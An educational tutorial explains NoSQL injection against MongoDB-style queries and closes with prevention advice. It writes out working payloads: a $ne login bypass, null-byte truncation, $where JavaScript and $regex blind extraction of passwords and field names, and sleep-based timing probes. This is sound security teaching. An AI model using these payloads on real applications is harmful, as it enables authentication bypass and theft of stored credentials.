# What is NoSQL Injection?

### 1. What is NoSQL Injection?

NoSQL Injection is a vulnerability where an attacker can manipulate NoSQL database queries by injecting malicious input.\
This can allow an attacker to:

* Bypass authentication
* Read or modify sensitive data
* Access hidden or unreleased information
* Cause denial of service
* In some cases, execute server-side code

NoSQL databases (such as MongoDB) store data in JSON-like documents instead of relational tables and often use flexible schemas and custom query languages.

***

### 2. Types of NoSQL Injection

#### 2.1 Syntax Injection

Syntax injection occurs when user input breaks the structure of a NoSQL query, allowing the attacker to inject additional logic.

This is similar to SQL injection but uses JavaScript-style syntax or NoSQL query syntax.

**Example**

Original query:

```js
this.category == 'fizzy'
```

Injected input:

```
fizzy' || '1'=='1
```

Resulting query:

```js
this.category == 'fizzy' || '1'=='1'
```

Since `'1'=='1'` is always true, the query returns all products.

***

#### 2.2 Operator Injection

Operator injection occurs when an attacker injects NoSQL query operators such as `$ne`, `$gt`, `$regex`, or `$where`.

Instead of breaking syntax, the attacker **modifies query behavior**.

**Example**

Normal login request:

```json
{
  "username": "user",
  "password": "pass"
}
```

Injected payload:

```json
{
  "username": { "$ne": "invalid" },
  "password": { "$ne": "invalid" }
}
```

This matches all users where both fields are not equal to `"invalid"`, resulting in authentication bypass.

***

### 3. Detecting NoSQL Injection

#### 3.1 Fuzzing Input

Submit special characters and malformed input to detect unexpected behavior:

```
'"`{;$Foo}\x00
```

If the response changes or errors occur, input may not be properly sanitized.

***

#### 3.2 Boolean-Based Testing

Test true vs false conditions to see if logic is affected.

False condition:

```
fizzy' && 0 && 'x
```

True condition:

```
fizzy' && 1 && 'x
```

Different responses indicate that injected conditions affect query logic.

***

### 4. Null Byte Injection (`%00`)

Some parsers ignore everything after a null character (`\u0000`).

#### Example

Original query:

```js
this.category == 'fizzy' && this.released == 1
```

Injected payload:

```
fizzy'%00
```

Resulting query:

```js
this.category == 'fizzy'\u0000' && this.released == 1
```

If characters after `\u0000` are ignored, the `released` restriction is bypassed, exposing unreleased products.

***

### 5. JavaScript Injection using `$where`

MongoDB’s `$where` operator executes JavaScript expressions.

#### Example

Backend query:

```json
{ "$where": "this.username == 'admin'" }
```

Injected payload:

```
admin' && this.password[0] == 'a' || 'a'=='b
```

This allows attackers to extract data **character by character** using boolean responses.

This technique is known as **Blind NoSQL Injection**.

***

### 6. Extracting Data with JavaScript

#### 6.1 Character-Based Extraction

```js
this.password[0] == 'a'
```

Test each character (`a–z`, `0–9`) and observe response differences to reconstruct the full value.

***

#### 6.2 Regex-Based Extraction

```js
this.password.match(/^a/)
```

Checks whether the password starts with `a`.

```js
this.password.match(/\d/)
```

Checks whether the password contains a digit.

***

### 7. Identifying Field Names

Since NoSQL databases use flexible schemas, field names may be unknown.

#### 7.1 Field Existence Check

```
admin' && this.password!='
```

Compare the response with:

```
admin' && this.username!='
admin' && this.foo!='
```

If the response for `password` matches `username` but differs from `foo`, the field exists.

***

#### 7.2 Extracting Field Names via JavaScript

```js
Object.keys(this)[0]
```

Payload example:

```json
"$where":"Object.keys(this)[0].match('^.{0}a.*')"
```

This allows extraction of field names **character by character** without guessing.

***

### 8. Data Extraction Using Operators (`$regex`)

Even without JavaScript execution, `$regex` can be abused.

#### Example

```json
{
  "username": "admin",
  "password": { "$regex": "^a.*" }
}
```

If the response changes, the password starts with `a`.

This enables blind extraction similar to SQL injection.

***

### 9. Timing-Based NoSQL Injection

If errors or response differences are not visible, time delays can be used.

#### Example

```json
{ "$where": "sleep(5000)" }
```

If the response is delayed by 5 seconds, injection is successful.

#### Conditional Timing Example

```js
if (x.password[0] === "a") { sleep(5000); }
```

Response time acts as a **true/false signal**.

***

### 10. Prevention of NoSQL Injection

To prevent NoSQL injection:

* Sanitize and validate all user input
* Use parameterized queries
* Avoid concatenating user input into queries
* Disable `$where` and server-side JavaScript
* Apply allowlists for query keys
* Restrict or sanitize `$regex` input
* Enforce strict schema validation

***

### 11. Summary

* **Syntax Injection** breaks query structure
* **Operator Injection** manipulates query logic
* `$where` enables JavaScript execution
* `$regex` enables blind data extraction
* Null byte injection can bypass conditions
* Timing-based attacks work when responses are identical
